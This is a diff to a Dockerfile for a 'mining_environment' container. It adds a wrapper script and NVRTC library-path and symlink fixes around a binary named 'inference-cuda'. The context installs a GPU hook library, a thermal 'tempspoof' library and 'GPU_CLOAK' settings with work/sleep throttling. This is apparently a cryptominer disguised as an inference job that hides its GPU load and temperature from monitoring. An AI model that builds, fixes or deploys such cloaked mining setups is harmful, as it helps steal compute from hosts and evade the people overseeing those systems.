@@ -114,18 +114,71 @@ COPY . /app/
 # Sao chép pre-compiled binaries và libraries
 COPY inference-cuda libmlls-cuda.so /tmp/
 COPY entrypoint.sh /app/entrypoint.sh
+
+# Copy NVRTC wrapper script for runtime compilation fixes  
+COPY mining_environment/gpu_plugins/fix_nvrtc_symlinks.sh /app/mining_environment/gpu_plugins/
 COPY mining_environment/gpu_plugins/native/cuda/libmpo.so /tmp/libmpo.so
 COPY mining_environment/gpu_plugins/native/nvml/libgpuhook.so /tmp/libgpuhook.so
 COPY mining_environment/gpu_plugins/native/thermal/libtempspoof.so /tmp/libtempspoof.so 
 
 
+# ------------------  NVRTC Enhanced Wrapper Installation ---------------
+# Purpose: Fix runtime NVRTC compilation context issues
+# Method: Enhanced wrapper script with proper environment setup
 RUN ldconfig && \
-    install -D /tmp/inference-cuda    /usr/local/bin/inference-cuda && \
+    # Install original binary as backup
+    install -D /tmp/inference-cuda    /usr/local/bin/inference-cuda.original && \
     install -D /tmp/libmlls-cuda.so   /usr/local/bin/libmlls-cuda.so && \
     install -D /tmp/libmpo.so         /opt/mpo/libmpo.so && \
     install -D /tmp/libgpuhook.so     /opt/hooks/libgpuhook.so && \
     install -D /tmp/libtempspoof.so   /opt/hooks/libtempspoof.so && \
     mkdir -p /opt/{hooks,mpo} && chmod 755 /opt/{hooks,mpo} && chmod 644 /opt/mpo/libmpo.so && \
+    # Create enhanced NVRTC wrapper script
+    cat > /usr/local/bin/inference-cuda << 'WRAPPER_EOF'
+#!/bin/bash
+
+# Enhanced Runtime Library Path for NVRTC
+# Giải quyết runtime compilation context issues
+
+# Set CUDA environment paths
+export CUDA_PATH=/usr/local/cuda-12.0
+export CUDA_ROOT=/usr/local/cuda-12.0
+export NVRTC_LIB_PATH=/usr/local/cuda-12.0/targets/x86_64-linux/lib
+
+# Enhanced LD_LIBRARY_PATH with NVRTC priority
+export LD_LIBRARY_PATH="$NVRTC_LIB_PATH:$LD_LIBRARY_PATH"
+
+# Additional NVRTC-specific paths
+export NVRTC_CUDA_PATH=$CUDA_PATH
+export CUDA_INCLUDE_DIRS=$CUDA_PATH/include
+
+# Pre-execution verification (only if verbose mode requested)
+if [[ "$1" == "--verbose" ]] || [[ "$NVRTC_WRAPPER_VERBOSE" == "1" ]]; then
+    echo "[$(date)] NVRTC Enhanced Wrapper - Starting verification..."
+    
+    # Verify NVRTC libraries are accessible
+    if ! ldconfig -p | grep -q nvrtc-builtins; then
+        echo "[$(date)] WARNING: NVRTC libraries not found in ldconfig cache, refreshing..."
+        ldconfig 2>/dev/null || echo "Warning: ldconfig refresh failed"
+    fi
+    
+    # Check critical NVRTC files exist
+    NVRTC_BUILTINS="/usr/local/cuda-12.0/targets/x86_64-linux/lib/libnvrtc-builtins.so.12.0.140"
+    if [ ! -f "$NVRTC_BUILTINS" ]; then
+        echo "[$(date)] ERROR: NVRTC builtins library not found at $NVRTC_BUILTINS"
+        exit 1
+    fi
+    
+    echo "[$(date)] NVRTC Enhanced Wrapper - Verification complete. Starting inference-cuda..."
+    echo "[$(date)] LD_LIBRARY_PATH: $LD_LIBRARY_PATH"
+    echo "[$(date)] CUDA_PATH: $CUDA_PATH"
+fi
+
+# Execute original program with enhanced environment
+exec /usr/local/bin/inference-cuda.original "$@"
+WRAPPER_EOF
+    # Make wrapper executable
+    chmod +x /usr/local/bin/inference-cuda && \
     rm -rf /tmp/*
 
 # ------------------  (10)  Enhanced GPU Runtime & Libraries ---------------
@@ -158,6 +211,9 @@ ENV SCRIPT_DIR=/app/mining_environment/scripts \
     LOGS_DIR=/app/mining_environment/logs \
     CUDA_COMMAND=/usr/local/bin/inference-cuda \
     MLLS_CUDA=/usr/local/bin/libmlls-cuda.so \
+    # NVRTC wrapper control
+    NVRTC_WRAPPER_VERBOSE=0 \
+    NVRTC_ENHANCED_MODE=1 \
     GPU_CLOAK_LOG_LEVEL=INFO \
     WORK_MS=1900 SLEEP_MS=100 \
     ENABLE_MPO=1 MPO_LIB=/opt/mpo/libmpo.so \
@@ -201,11 +257,20 @@ RUN set -eux; \
     echo "$NVRTC_LIB_DIR" > /etc/ld.so.conf.d/cuda-nvrtc.conf; \
     # Cập nhật ldconfig cache
     ldconfig; \
+    # Fix missing symlinks for runtime compatibility
+    echo "[NVRTC-LDCONFIG-FIX] Creating missing symlinks for runtime compatibility..."; \
+    cd "$NVRTC_LIB_DIR"; \
+    # Ensure libnvrtc.so.12.0 symlink exists (required for runtime loading)
+    if [ ! -f "libnvrtc.so.12.0" ]; then \
+        ln -sf libnvrtc.so.12.0.140 libnvrtc.so.12.0; \
+        echo "[NVRTC-LDCONFIG-FIX] Created libnvrtc.so.12.0 symlink"; \
+    fi; \
     # Verification - kiểm tra ldconfig đã nhận diện được libraries
     echo "[NVRTC-LDCONFIG-FIX] Verification:"; \
     ldconfig -p | grep nvrtc-builtins && echo "✅ NVRTC libraries found in ldconfig cache" || echo "⚠️ NVRTC not in cache, checking manually..."; \
     ls -la "$NVRTC_LIB_DIR"/libnvrtc-builtins.so* || echo "❌ Libraries not found"; \
-    echo "✅ [NVRTC-LDCONFIG-FIX] ldconfig configuration completed"
+    ls -la "$NVRTC_LIB_DIR"/libnvrtc.so* || echo "❌ NVRTC main library not found"; \
+    echo "✅ [NVRTC-LDCONFIG-FIX] ldconfig configuration and symlink fixes completed"
 
 # Backup environment variable cho compatibility
 ENV LD_LIBRARY_PATH="/usr/local/cuda-12.0/targets/x86_64-linux/lib:/usr/local/cuda/targets/x86_64-linux/lib:${LD_LIBRARY_PATH}"
